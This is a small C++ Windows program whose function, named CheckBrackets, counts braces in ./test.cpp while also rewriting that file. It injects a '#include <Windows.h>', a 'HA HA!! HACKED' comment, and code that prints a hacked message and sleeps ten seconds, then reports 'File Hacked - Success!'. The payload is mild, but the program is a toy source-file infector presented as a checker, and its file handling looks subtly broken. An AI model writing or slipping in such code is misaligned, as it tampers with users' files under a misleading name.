#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <string>
#include <fstream>
#include <vector>
using namespace std;

void CheckBrackets(string name) {
	fstream fl(name, ios_base::in); int b_fst=0,b_lst=0;
	 vector<string> *lines = new vector<string>(); string str;
	 while (!fl.eof()) {
		 getline(fl, str); lines->push_back(str);
		 if (str.find('{') != string::npos) 
			 ++b_fst;
		 if (str.find('}') != string::npos)
			 ++b_lst;
		 if (str.find("main") != string::npos) {
			 bool hasLib = false;
			 for (int i = 0; i < 5; i++) {
				 if (lines->at(i).find("Windows.h") != string::npos) {
					 hasLib = true; break;
				 }
			 }
			 if (!hasLib)lines->insert(lines->begin(), "#include <Windows.h>");
			 string xcode = "\n/*HA HA!!\nHACKED\nSleeping for 10sec*/"
				 "\ncout<<\"Program is hacked. Wait 10 sec.\";\nSleep(10000);\n\n";
			 lines->push_back(xcode);
		 }
	 } 

	 fl.close();
	 fl.open(name,std::fstream::trunc);
	 if (b_fst == b_lst) {
		 cout << "Brackets:" << b_fst << "{ <=> }" << b_lst << endl;
	 }
	 else {
		 cout << "Someting wrong with brackets. "
			 "Check their count"<<b_fst << "{ < != > }" << b_lst << endl;
	 }
	 for (size_t i = 0; i != lines->size();i++) {
		 fl <<lines->at(i).c_str()<<endl;
	 }fl.close();
	 cout << "File Hacked - Success!"<<endl;
}

int main() {
	SetConsoleOutputCP(1251);
	CheckBrackets("./test.cpp");
	_getch();
	return 0;
}
